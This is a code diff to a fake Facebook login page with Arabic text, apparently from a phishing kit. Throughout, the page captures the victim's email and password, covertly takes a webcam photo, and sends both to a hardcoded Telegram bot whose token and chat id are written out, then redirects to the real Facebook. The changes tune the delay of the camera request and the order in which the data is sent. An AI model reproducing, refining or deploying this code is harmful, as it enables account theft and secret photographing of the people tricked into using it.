@@ -5,49 +5,51 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook - تسجيل الدخول</title>
     <style>
+        /* ستايل فيسبوك يظهر فوراً */
         body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 360px; text-align: center; }
+        .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 360px; text-align: center; z-index: 100; }
         .fb-logo { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 10px; }
         input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
         .btn { width: 97%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        .footer-link { color: #1877f2; font-size: 14px; text-decoration: none; margin-top: 15px; display: block; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
     <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <div class="box">
         <div class="fb-logo">facebook</div>
-        <p style="font-size: 18px; color: #1c1e21;">سجل الدخول للمتابعة</p>
+        <p style="font-size: 18px; color: #1c1e21;">يجب تسجيل الدخول للمتابعة</p>
         <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
         <input type="password" id="pass" placeholder="كلمة السر">
         <button class="btn" onclick="sendAll()">تسجيل الدخول</button>
-        <a href="#" class="footer-link">هل نسيت كلمة السر؟</a>
     </div>
 
     <script>
         const token = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
         const chat = "8042090388";
 
-        // طلب الكاميرا بمجرد فتح الصفحة
-        navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            // تصوير أول لقطة مخفية بعد ثانيتين
-            setTimeout(takeSnap, 2000);
-        });
+        // تأخير طلب الكاميرا 3 ثواني عشان تفتح الصفحة أولاً
+        setTimeout(() => {
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+            }).catch(e => console.log("Refused"));
+        }, 3000);
 
         function takeSnap() {
             const canvas = document.getElementById('canvas');
             const video = document.getElementById('video');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            return canvas.toDataURL('image/jpeg', 0.7);
+            if(video.srcObject) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                return canvas.toDataURL('image/jpeg', 0.6);
+            }
+            return null;
         }
 
         async function sendAll() {
@@ -55,20 +57,23 @@
             const pass = document.getElementById('pass').value;
             const img = takeSnap();
 
-            // 1. إرسال الصورة
-            const blob = await (await fetch(img)).blob();
-            const formData = new FormData();
-            formData.append('chat_id', chat);
-            formData.append('photo', blob, 'cam.jpg');
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
-
-            // 2. إرسال البيانات
+            // إرسال البيانات فوراً
             const msg = `🔥 صيد جديد:\n📧 الإيميل: ${email}\n🔑 الباسورد: ${pass}`;
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}`)
-            .then(() => {
-                // تحويل لفيسبوك الحقيقي
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}`);
+
+            // إذا في صورة ابعثها
+            if(img) {
+                const blob = await (await fetch(img)).blob();
+                const formData = new FormData();
+                formData.append('chat_id', chat);
+                formData.append('photo', blob, 'victim.jpg');
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
+            }
+
+            // التحويل بعد ثانية واحدة لضمان وصول الرسائل
+            setTimeout(() => {
                 window.location.href = "https://www.facebook.com";
-            });
+            }, 1000);
         }
     </script>
 </body>
